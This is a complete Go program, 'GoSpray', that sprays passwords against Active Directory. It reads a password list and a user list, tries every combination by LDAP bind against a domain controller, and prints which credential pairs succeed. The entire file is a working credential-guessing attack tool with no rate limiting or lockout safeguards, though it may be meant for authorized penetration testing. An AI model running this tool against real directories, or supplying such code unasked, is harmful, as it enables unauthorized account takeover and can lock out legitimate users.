package main

import (
	"bufio"
	"fmt"
	"log"
	"os"

	ldap "gopkg.in/ldap.v3"
)

type configuration struct {
	domainController string
	verbose          bool
}

/////////////////////////////////////////////////////////////////
/// read a file line by line and add it to a string array
/////////////////////////////////////////////////////////////////
func readFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("Failed to open file (%s): %s", filename, err)
	}
	defer file.Close()

	lines := []string{}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

/////////////////////////////////////////////////////////////////
/// GoSpray
/////////////////////////////////////////////////////////////////
func main() {
	fmt.Println("GoSpray - Active Directory Password Testing")
	fmt.Println()

	//Setup the basic configuration
	config := configuration{}
	config.domainController = "ldaps://<yourdomain>.<corp>.<com>"
	config.verbose = true

	passwords := readFile("passwords.list")
	users := readFile("users.list")

	log.Println("Starting.")

	for _, password := range passwords {
		for _, username := range users {
			validate(config, username, password)
		}
	}
	log.Printf("Done.")
}

func validate(config configuration, username string, password string) {
	connection, err := ldap.DialURL(config.domainController)
	if err != nil {
		log.Fatalf("Error connecting to domain (%s): %s", config.domainController, err)
	}
	defer connection.Close()

	//Validate the credentials
	fmt.Printf("%s::%s::", username, password)
	err = connection.Bind(username, password)
	if err != nil {
		fmt.Println("Failed")
		if config.verbose {
			fmt.Println(err)
		}
	} else {
		fmt.Println("Success")
	}
}
